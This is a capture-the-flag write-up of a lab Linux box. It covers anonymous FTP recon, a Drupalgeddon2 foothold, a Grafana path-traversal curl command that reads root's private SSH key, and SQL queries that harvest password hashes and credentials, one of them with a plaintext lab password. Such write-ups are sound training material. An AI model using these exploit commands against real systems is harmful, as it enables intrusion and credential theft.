---
description: "Medium Linux box. Anonymous FTP for recon, Drupalgeddon2 for the shell, then Grafana 8.2.6 path traversal reads root's SSH key. Credential harvest from the Drupal DB feeds the rest of the chain."
tags: ["drupal", "cve-2018-7600", "grafana", "cve-2021-43798", "path-traversal", "linux", "hackini"]
title: "HackINI 2026: Corp Monitor"
date: 2026-05-26
draft: false
---


A Linux machine running a Drupal intranet CMS with an anonymous FTP server sitting next to it. The FTP turned out to be more of a hint than an attack surface. The real entry was Drupalgeddon2, a 2018 RCE that still shows up everywhere. Once inside, Grafana 8.2.6 was hiding on port 3000, running an unauthenticated path traversal that handed over root's SSH key directly.

*Did this one with [Aymen](https://www.linkedin.com/in/aymen-drid-36bba4243/). Always more fun when someone's hunting alongside you and just as locked in. Big shoutout to him.*

## Recon

Three machines in scope, scanned all of them at once:

```bash
nmap -sV -sC -T4 10.186.15.193 10.186.15.195 10.186.15.196
```

For `.193` specifically:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 May 18 17:18 HR
| drwxr-xr-x    2 0        0            4096 May 18 17:18 IT
|_-rwxr-xr-x    1 0        0             200 May 18 17:18 welcome.txt
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.52
|_http-generator: Drupal 7
|_http-title: CORP Intranet CMS
```

FTP with anonymous login, SSH, and Drupal 7 on port 80. The folder names `HR` and `IT` made it clear this was simulating a real corporate environment. I grabbed everything from FTP in one shot:

```bash
wget -r --no-parent ftp://anonymous:anonymous@10.186.15.193/
```

![IT/future_tasks.txt from the FTP share showing pending tasks hinting at a monitoring dashboard and backup service](/images/writeups/hackini-corp-monitor/backup_hint.png)

The IT department's task list mentioned adding a monitoring dashboard and a backup service for critical databases, which pointed to something worth looking for later.

On port 80, first thing I always check on a Drupal site is the changelog:

```bash
curl http://10.186.15.193/CHANGELOG.txt | head -50
```

```
Drupal 7.57, 2018-02-21
```

Version 7.57. CVE-2018-7600 was patched in 7.58, so this was wide open. The `robots.txt` had 36 disallowed entries confirming standard Drupal structure with no custom hardening.

## Foothold

Drupal 7.x before 7.58 doesn't sanitize user-submitted data during the registration process. The `#post_render`, `#pre_render`, and `#access_callback` form API properties can be abused to execute arbitrary PHP. No authentication required.

```bash
python3 drupalgeddon2.py http://10.186.15.193/
```

Shell landed as `www-data`.

## Grafana Path Traversal

With a shell as `www-data`, one of the challenge hints mentioned another service running on the machine. Port scan from inside:

```bash
ss -tlnp
```

Port 3000 was listening, bound to localhost: **Grafana 8.2.6**. Not exposed externally, only reachable from the machine itself.

That version is CVE-2021-43798, unauthenticated arbitrary file read via path traversal in the plugin endpoint. The URL pattern `/public/plugins/<plugin-name>/` serves static plugin assets but doesn't sanitize the path, so you can traverse out and read any file Grafana can access. Since it was only on localhost, the request had to come from the shell:

```bash
curl --path-as-is \
  "http://127.0.0.1:3000/public/plugins/alertlist/../../../../../../../../../root/.ssh/id_rsa"
```

Two things to keep in mind:
- `--path-as-is` tells curl not to normalize the path before sending. Without it, curl collapses the `../` sequences
- The plugin name has to be a valid installed plugin. `alertlist` is a Grafana built-in, so it's almost always there

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gt
...
-----END OPENSSH PRIVATE KEY-----
```

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@10.186.15.193
```

Root on corp-monitor.

## Credential Mining

With root access I went after the Drupal database. The backup hint from FTP led me to `backup.sh`:

![backup.sh showing mysqldump command with hardcoded root MySQL credentials](/images/writeups/hackini-corp-monitor/backup_script.png)

```sql
mysql -u drupaluser -p'fMlG4DK3TGfz208X' drupaldb \
  -e "SELECT name,pass FROM users;"
```

Full user table: Drupal password hashes (`$S$D...` format, SHA-512 with salt) for every user on the platform:

```
admin       $S$DyGe0aGEWc1QvH9XZFHf8I2rfNlP...
h.dhayaa    $S$DBkiUk25FO/FRoBkEtrRFhQas8iuDn1...
b.anes      $S$D3.zgIJy8cZvpPIERK9g3JFFsRMw...
b.djawad    $S$Dal5fIRy2xWT.mawdvDUWEdbSd...
h.raouf     $S$DRIAcOVxfnkZOkjU8Z4vTgxBVKAlFA0...
```

I also queried the Drupal content for anything credential-related:

```sql
SELECT n.title, u.name, b.body_value
FROM node n
LEFT JOIN users u ON u.uid = n.uid
LEFT JOIN field_data_body b ON b.entity_id = n.nid
WHERE LOWER(CONCAT_WS(' ', n.title, b.body_value))
  REGEXP 'password|passwd|pass|credential|creds|login|admin';
```

This surfaced internal posts with hardcoded credentials in the CMS content, the kind of thing that happens in real orgs when people use the intranet as a shared notes app. These credentials fed directly into the next machine in the chain.

## Summary

```
Anonymous FTP  → context + backup hint
Drupal 7.57    → CVE-2018-7600 → www-data shell
www-data shell → localhost:3000 → Grafana 8.2.6
Grafana        → CVE-2021-43798 → root SSH key → root
Drupal DB      → credential harvest → pivot to .195
```

Two CVEs, both pre-auth. The interesting design here was layering them: Drupal got you a shell, but Grafana got you directly to root without any local privesc. The credential harvest was what actually mattered for the larger pentest chain.

The backup SQLite in the FTP was a nice touch. It simulated the kind of thing that quietly accumulates in real corporate environments: automated backups accessible to anyone on the network, containing the entire application database.
